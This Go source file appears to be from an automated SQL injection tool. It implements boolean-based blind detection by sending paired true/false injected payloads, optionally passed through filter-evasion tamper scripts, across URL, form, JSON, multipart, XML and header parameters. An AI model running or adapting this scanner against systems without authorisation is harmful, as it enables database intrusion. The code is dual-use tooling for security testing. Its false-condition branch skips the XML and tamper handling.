package core

import (
	"encoding/json"
	"math/rand"
	"strconv"
	"strings"
	"time"

	"github.com/R0X4R/sqligo/pkg/config"
	"github.com/R0X4R/sqligo/pkg/logger"
	"github.com/R0X4R/sqligo/pkg/payloads"
	"github.com/R0X4R/sqligo/pkg/request"
	"github.com/R0X4R/sqligo/pkg/tamper"
	"github.com/R0X4R/sqligo/pkg/utils"
)

// CheckBooleanBasedSqli performs boolean-based blind SQL injection checks
func CheckBooleanBasedSqli(urlStr, data, param, value string, isHeader bool, isJson bool, isMultipart bool, isXml bool) *InjectionResult {
	if payloads.GlobalPayloads == nil {
		payloads.Init()
	}

	// 1. Establish Baseline
	// We need the "Original" response to compare against.
	reqBase := request.NewRequest(urlStr)
	reqBase.Data = data
	// If it's a header injection, we assume the baseline *includes* the original header value?
	// Or we just use default headers.
	// For simplicity, we assume generic baseline.
	// NOTE: If we are injecting a specific header (e.g. User-Agent), we should probably set it in the baseline to the original value first?
	// The current request.NewRequest likely uses default UA unless config.UserAgent is set.
	// We will handle injection by *overwriting* headers in the injected request.

	respBase, err := reqBase.Execute()
	if err != nil {
		logger.Error("Failed to fetch baseline: %v", err)
		return &InjectionResult{Vulnerable: false}
	}
	baseBody := respBase.Body

	tests := payloads.GlobalPayloads.BooleanTests["boolean-based"]

	for _, test := range tests {
		if config.GlobalConfig.Backend != "" && test.Dbms != "" && test.Dbms != config.GlobalConfig.Backend {
			continue
		}

		// Logic to replace [RANDNUM]
		randNum := strconv.Itoa(rand.Intn(9999) + 1000)
		payloadStr := strings.ReplaceAll(test.Payload, "[RANDNUM]", randNum)

		for _, comment := range test.Comments {
			// Apply Prefix/Suffix
			pref := comment.Pref
			if config.GlobalConfig.Prefix != "" {
				pref = config.GlobalConfig.Prefix + pref
			}
			suf := comment.Suf
			if config.GlobalConfig.Suffix != "" {
				suf = suf + config.GlobalConfig.Suffix
			}
			fullPayload := pref + payloadStr + suf

			// Apply tamper scripts if configured
			if len(config.GlobalConfig.Tamper) > 0 {
				fullPayload = tamper.ApplyChain(fullPayload, config.GlobalConfig.Tamper)
			}

			// Inject
			var injectedUrl string
			var injectedData string
			var injectedHeaders map[string]string

			if isHeader {
				injectedUrl = urlStr
				injectedData = data
				injectedHeaders = make(map[string]string)
				injectedHeaders[param] = value + fullPayload
			} else if isJson {
				injectedUrl = urlStr
				injectedHeaders = nil
				var jMap map[string]interface{}
				// ignore error here as we validated earlier
				_ = json.Unmarshal([]byte(data), &jMap)
				jMap[param] = value + fullPayload // Inject payload
				byteData, _ := json.Marshal(jMap)
				injectedData = string(byteData)
				injectedData = string(byteData)
			} else if isMultipart {
				injectedUrl = urlStr
				injectedData = utils.ReplaceMultipartValue(data, param, value+fullPayload) // Call helper
			} else if isXml {
				injectedUrl = urlStr
				injectedData = utils.ReplaceXmlValue(data, param, value+fullPayload)
			} else {
				if data != "" {
					injectedData = strings.Replace(data, param+"="+value, param+"="+value+utils.UrlEncode(fullPayload), 1)
					injectedUrl = urlStr
				} else {
					injectedUrl = strings.Replace(urlStr, param+"="+value, param+"="+value+utils.UrlEncode(fullPayload), 1)
				}
			}

			// Request 1: TRUE condition (AND 1=1 should look like Base)
			reqTrue := request.NewRequest(injectedUrl)
			reqTrue.Data = injectedData
			if isHeader {
				for k, v := range injectedHeaders {
					reqTrue.Headers[k] = v
				}
			}

			respTrue, err := reqTrue.Execute()
			if err != nil {
				continue
			}

			// If TRUE response is NOT similar to BASE, then this payload format broke the page/query
			// So it's likely not a valid injection point for this payload style
			// Typically we look for High Similarity here (e.g. > 0.98)

			// Custom Filters Logic
			var passedTrue bool
			if config.GlobalConfig.Code != 0 {
				passedTrue = (respTrue.StatusCode == config.GlobalConfig.Code)
			} else if config.GlobalConfig.String != "" {
				passedTrue = strings.Contains(respTrue.Body, config.GlobalConfig.String)
			} else if config.GlobalConfig.NotString != "" {
				passedTrue = !strings.Contains(respTrue.Body, config.GlobalConfig.NotString)
			} else {
				// Heuristic
				ratioTrue := utils.GetRatio(baseBody, respTrue.Body)
				passedTrue = (ratioTrue >= 0.95)
			}

			if passedTrue { // Potential Candidate!
				// Now we verify with FALSE condition (AND 1=2 should look DIFFERENT from Base)

				randNum2 := strconv.Itoa(rand.Intn(9999) + 1000)
				falsePayloadStr := strings.ReplaceAll(test.Payload, "[RANDNUM]", randNum2)
				// Create the False logic: replace the comparison to be false
				// E.g. AND 1234=1234 -> AND 1234=9876
				diffNum := strconv.Itoa(rand.Intn(9999) + 10000)
				falsePayloadStr = strings.Replace(falsePayloadStr, "="+randNum2, "="+diffNum, 1)

				fullFalsePayload := pref + falsePayloadStr + suf

				var injectedUrlFalse string
				var injectedDataFalse string
				var injectedHeadersFalse map[string]string

				if isHeader {
					injectedUrlFalse = urlStr
					injectedDataFalse = data
					injectedHeadersFalse = make(map[string]string)
					injectedHeadersFalse[param] = value + fullFalsePayload
				} else if isJson {
					injectedUrlFalse = urlStr
					var jMap map[string]interface{}
					_ = json.Unmarshal([]byte(data), &jMap)
					jMap[param] = value + fullFalsePayload
					byteData, _ := json.Marshal(jMap)
					injectedDataFalse = string(byteData)
					injectedDataFalse = string(byteData)
				} else if isMultipart {
					injectedUrlFalse = urlStr
					injectedDataFalse = utils.ReplaceMultipartValue(data, param, value+fullFalsePayload)
				} else {
					if data != "" {
						injectedDataFalse = strings.Replace(data, param+"="+value, param+"="+value+utils.UrlEncode(fullFalsePayload), 1)
						injectedUrlFalse = urlStr
					} else {
						injectedUrlFalse = strings.Replace(urlStr, param+"="+value, param+"="+value+utils.UrlEncode(fullFalsePayload), 1)
					}
				}

				reqFalse := request.NewRequest(injectedUrlFalse)
				reqFalse.Data = injectedDataFalse
				if isHeader {
					for k, v := range injectedHeadersFalse {
						reqFalse.Headers[k] = v
					}
				}

				respFalse, err := reqFalse.Execute()
				if err != nil {
					continue
				}

				// VULNERABLE IF:
				// True ~ Base AND False !~ Base
				// Meaning: Correct SQL kept page same, Broken Logic changed page.

				var passedFalse bool
				if config.GlobalConfig.Code != 0 {
					passedFalse = (respFalse.StatusCode != config.GlobalConfig.Code) // Should NOT match code
				} else if config.GlobalConfig.String != "" {
					passedFalse = !strings.Contains(respFalse.Body, config.GlobalConfig.String) // Should NOT contain string
				} else if config.GlobalConfig.NotString != "" {
					passedFalse = strings.Contains(respFalse.Body, config.GlobalConfig.NotString)
				} else {
					ratioFalse := utils.GetRatio(baseBody, respFalse.Body)
					passedFalse = (ratioFalse < 0.90)
				}

				if passedFalse { // Sufficiently different
					return &InjectionResult{
						Vulnerable:    true,
						Parameter:     param,
						InjectionType: "Boolean-based blind",
						Vector:        test.Vector,
						Payload:       fullPayload,
						Backend:       test.Dbms,
					}
				}
			}

			if config.GlobalConfig.Delay > 0 {
				time.Sleep(time.Duration(config.GlobalConfig.Delay) * time.Second)
			}
		}
	}

	return &InjectionResult{Vulnerable: false}
}
